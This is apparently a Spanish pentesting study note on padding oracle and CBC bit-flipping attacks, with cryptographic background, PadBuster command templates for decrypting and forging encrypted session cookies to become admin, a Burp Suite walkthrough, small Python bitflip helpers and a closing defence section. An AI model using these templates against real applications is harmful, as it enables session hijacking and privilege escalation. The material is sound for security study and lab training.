## 📚 **Índice 

- [[#🎯 1. ¿Qué es realmente un Padding Oracle Attack?]]
- [[#🧱 2. Conceptos que DEBES entender antes del ataque]]
    - [[#2.1 Bloques, CBC y XOR explicado como para un ninja]]
    - [[#2.2 ¿Qué es PKCS#7? (El relleno más usado en el mundo) ]]
    - [[#2.3 Qué es EXACTAMENTE un “oráculo de relleno”?]]
- [[#🔍 3. Cómo detectar un Padding Oracle en una aplicación real]]
    - [[#3.1 Indicadores de error]]
    - [[#3.2 Indicadores de tiempo (timing oracle)]]
    - [[#3.3 Cookies cifradas vulnerables]]
- [[#🧠 4. Cómo funciona el ataque (paso a paso, sin magia)]]
    - [[#4.1 CBC explicado byte a byte]]
    - [[#4.2 El objetivo del Pentester]]
    - [[#4.3 Descifrar un solo byte]]
    - [[#4.4 Descifrar todo un bloque]]
    - [[#4.5 Descifrar el mensaje completo]]
- [[#🛠️ 5. Uso profesional de PadBuster (con ejemplos reales)]]
    - [[#5.1 Descifrar una cookie completa]]
    - [[#5.2 Secuestro de sesión (modificar plaintext)]]
    - [[#5.3 Modificar parámetros internos]]
- [[#🚀 6. PLANTILLAS profesionales]]
    - [[#6.1 Comando base]]
    - [[#6.2 Template para privilegios]]
    - [[#6.3 Template para ataque manual]]
- [[#💣 6.4 Ataque Bit-Flipper con Burp Suite (técnica REAL sin oráculo)]]
- [[#📦 7. Caso práctico (PentesterLab / Vulnhub)]]
- [[#🛡️ 8. Cómo defender (lo que realmente funciona)]]
    

---

# 🎯 **1. ¿Qué es realmente un Padding Oracle Attack?**

Un **Padding Oracle Attack** permite a un atacante:

- **DESCIFRAR datos cifrados en CBC**
    
- **MODIFICAR datos cifrados**
    
- **SIN conocer la clave**
    
- **SIN romper el cifrado**
    
- **SOLO usando el comportamiento de la aplicación** (oráculo)  
    El atacante usa la aplicación como “adivina”: envía mensajes alterados y la aplicación responde:
    
- ❌ _“Padding inválido”_
    
- ✔️ _“Padding correcto”_  
    → Ese **bit de información** es suficiente para descifrar **todo el ciphertext**.
    

---

# 🧱 **2. Conceptos que DEBES entender antes del ataque**

## **2.1 Bloques, CBC y XOR explicado como para un ninja**

CBC en cifrado:

```
Plaintext ⊕ IV → C1
Plaintext2 ⊕ C1 → C2
Plaintext3 ⊕ C2 → C3
```

CBC en descifrado:

```
Decryption(C1) ⊕ IV → P1
Decryption(C2) ⊕ C1 → P2
```

➡️ **Al alterar el IV o C(n–1) cambias el plaintext del siguiente bloque**.

---

## **2.2 ¿Qué es PKCS#7? (El relleno más usado en el mundo)**

Bloques de **16 bytes** (AES-CBC).  
Si faltan bytes:

- 1 byte → `0x01`
    
- 2 bytes → `0x02 0x02`
    
- 5 bytes → `0x05 0x05 0x05 0x05 0x05`  
    Incluso si el plaintext cabe exacto → se añade **un bloque completo de relleno**.
    

---

## **2.3 Qué es EXACTAMENTE un “oráculo de relleno”?**

Cualquier sistema que al enviar ciphertext alterado responde diferente:

- Error distinto
    
- Tiempo distinto
    
- HTTP 200 vs 500
    
- Mensaje explícito: `"invalid padding"`  
    Con esto puedes:
    
- Descifrar
    
- Modificar datos
    
- Escalar privilegios
    
- Secuestrar sesiones
    

---

# 🔍 **3. Cómo detectar un Padding Oracle en una aplicación real**

## **3.1 Indicadores de error**

Alteras 1 byte del último bloque.  
Si obtienes:

```
PaddingException
Invalid PKCS#7 padding
Decryption error
```

→ **Vulnerable**.

## **3.2 Indicadores de tiempo (timing oracle)**

Padding válido → pasa a lógica interna  
Padding inválido → falla antes  
Diferencias de **0.1 ms** son suficientes.

## **3.3 Cookies cifradas vulnerables**

Ejemplo:

```
auth=ab39f8172c9a9c919237bd81e1280971937fbc712...
```

Bloques fijos = AES-CBC + PKCS#7.  
Objetivo:

```
user=admin
role=admin
```

---

# 🧠 **4. Cómo funciona el ataque (paso a paso, sin magia)**

## **4.1 CBC explicado byte a byte**

```
P(n)[i] = Decrypt(Cn)[i] ⊕ C(n-1)[i]
```

→ Si alteras `C(n-1)[i]`, modificas **Pn**.

## **4.2 El objetivo del Pentester**

Lograr:

```
Pn[last_byte] = 0x01
```

Si el oráculo responde diferente → byte descubierto.

## **4.3 Descifrar un solo byte**

Pruebas 0–255 hasta que el oráculo cambia su comportamiento.

## **4.4 Descifrar todo un bloque**

Fuerzas:

```
0x02 0x02
0x03 0x03 0x03
...
0x10 ... 0x10
```

## **4.5 Descifrar el mensaje completo**

Bloque por bloque desde el final.

---

# 🛠️ **5. Uso profesional de PadBuster (con ejemplos reales)**

## **5.1 Descifrar una cookie completa**

```
padbuster https://victima.com/login ab39f8172c9a9c... 16 \
    -cookie "auth=ab39f8172c9a9c..." \
    -error "invalid padding"
```

Salida:

```
user=daniel&id=3&role=user
```

## **5.2 Secuestro de sesión (modificar plaintext)**

```
padbuster https://victima.com/login ab39f817... 16 \
    -cookie "auth=ab39f817..." \
    -plaintext "user=admin&id=1&role=admin"
```

## **5.3 Modificar parámetros internos**

Original:

```
user=3&role=user
```

Deseado:

```
user=1&role=admin
```

---

# 🚀 **6. PLANTILLAS profesionales**

## **6.1 Comando base**

```
padbuster <URL> <ciphertext> <BlockSize> -cookie "<name>=<cipher>" [opciones]
```

## **6.2 Template para privilegios**

```
padbuster https://objetivo.com/panel <cookie> 16 \
    -cookie "auth=<cookie>" \
    -plaintext "user=admin&role=admin"
```

## **6.3 Template para ataque manual**

```
Modificar C(n-1)[i] → enviar → observar error → repetir
```

---

# 💣 **6.4 Ataque Bit-Flipper con Burp Suite (técnica REAL sin oráculo)**

Este ataque **NO descifra**, pero **MODIFICA el plaintext** en CBC sin conocer la clave.

## **Cómo funciona el bit-flipping**

CBC:

```
P(n) = Decrypt(Cn) ⊕ C(n-1)
```

➡️ Cambias bits en `C(n-1)` → fuerzas cambios **controlados** en `P(n)`.

Ejemplo típico:

```
role=user  →  role=admin
```

## **Fórmula exacta del bitflip**

```
nuevo_byte = original_byte ⊕ valor_original ⊕ valor_deseado
```

Ejemplo:

```
'u' (0x75) → 'a' (0x61)
nuevo = original ⊕ 0x75 ⊕ 0x61
```

---

## **Bit-Flipping práctico con Burp Suite**

### **1. Capturas la cookie cifrada**

```
auth=8f2a9b7c3f119ab044c20d9fe12aad90d3...
```

### **2. Burp → Decoder → Hex**

### **3. Identificas qué bloque contiene el texto que quieres alterar**

Recuerda:

- Cambias C(n–1) para afectar P(n).
    

### **4. Decoder → Bit Flipper**

Burp te permite:

- Flipping de bits individuales
    
- Edición controlada
    
- Visualización hex clara
    

### **5. Envías el ciphertext modificado**

Si el servidor:

- No rompe padding
    
- No valida integridad  
    → **EXITO: eres admin, premium, root o lo que quieras.**
    

---

## **Script Python para calcular bitflips**

```python
def bitflip(original_byte, old_char, new_char):
    return original_byte ^ ord(old_char) ^ ord(new_char)
```

## **Modificar un bloque entero**

```python
def flip_block(prev_block, old, new):
    assert len(old) == len(new)
    p = bytearray(prev_block)
    for i in range(len(old)):
        p[i] ^= ord(old[i]) ^ ord(new[i])
    return bytes(p)
```

---

# 📦 **7. Caso práctico (PentesterLab / Vulnhub)**

- Cookie CBC
    
- Manipulación del último byte produce error
    
- PadBuster lo descifra: `user=daniel`
    
- Cambias plaintext → generas ciphertext → entras como admin  
    _(Aquí colocas tus capturas)_
    

---

# 🛡️ **8. Cómo defender (lo que realmente funciona)**

✔ **Nunca cifrar sin autenticar**  
✔ CBC + PKCS#7 solos → **SIEMPRE vulnerables**  
✔ Añadir **HMAC-SHA256** antes de descifrar  
✔ Comparación HMAC en **tiempo constante**  
✔ Usar cifrados modernos autenticados:

- AES-GCM
    
- ChaCha20-Poly1305
    

---
